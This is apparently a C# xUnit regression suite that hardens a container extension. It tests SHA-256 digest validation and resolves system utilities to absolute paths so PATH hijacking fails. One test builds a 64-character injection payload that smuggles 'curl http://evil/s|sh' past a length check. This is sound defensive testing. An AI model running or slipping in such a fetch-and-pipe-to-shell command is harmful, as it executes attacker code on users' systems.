using System;
using System.IO;
using ContainerExtension;
using ContainerExtension.Services;
using Xunit;

namespace ContainerExtension.UnitTests;

/// <summary>
/// Regression suite for external-command hardening: strict SHA-256 digest validation before a build-arg
/// reaches the terminal, and absolute-path resolution of system utilities to defeat PATH hijacking.
/// </summary>
public sealed class ExternalCommandHardeningTests
{
    [Theory]
    [InlineData("sha256:0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef", "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef")]
    [InlineData("0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF", "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef")]
    [InlineData("  sha256:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  ", "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa")]
    public void NormalizeSha256Digest_AcceptsWellFormed(string input, string expected)
    {
        Assert.Equal(expected, GitHubReleaseClient.NormalizeSha256Digest(input));
    }

    [Theory]
    [InlineData(null)]
    [InlineData("")]
    [InlineData("sha256:tooshort")]
    [InlineData("g23456789abcdef0123456789abcdef0123456789abcdef0123456789abcdefff")] // 'g' is not hex
    public void NormalizeSha256Digest_RejectsMalformed(string? input)
    {
        Assert.Null(GitHubReleaseClient.NormalizeSha256Digest(input));
    }

    [Fact]
    public void NormalizeSha256Digest_RejectsShellMetacharacterPayloadOfExactLength()
    {
        // 64 characters, but carrying a shell separator: a length-only check would have admitted this.
        var payload = "a;curl http://evil/s|sh;" + new string('a', 40);
        Assert.Equal(64, payload.Length);
        Assert.Null(GitHubReleaseClient.NormalizeSha256Digest(payload));
    }

    [Theory]
    [InlineData("stat")]
    [InlineData("id")]
    [InlineData("open")]
    [InlineData("xdg-open")]
    public void ResolveTrustedUnixBinary_ReturnsRootedAbsolutePath(string name)
    {
        var resolved = DockerExecutionStrategy.ResolveTrustedUnixBinary(name);
        Assert.True(Path.IsPathRooted(resolved), $"'{resolved}' must be absolute, never resolved via PATH");
        Assert.EndsWith("/" + name, resolved, StringComparison.Ordinal);
    }

    [Fact]
    public void ResolveTrustedUnixBinary_PrefersAnExistingTrustedLocation()
    {
        if (!OperatingSystem.IsMacOS() && !OperatingSystem.IsLinux())
        {
            return; // POSIX-only: /usr/bin or /bin
        }
        var resolved = DockerExecutionStrategy.ResolveTrustedUnixBinary("stat");
        // stat is a coreutils/BSD staple present on every supported POSIX host.
        Assert.True(File.Exists(resolved), $"expected a real binary at '{resolved}'");
    }
}
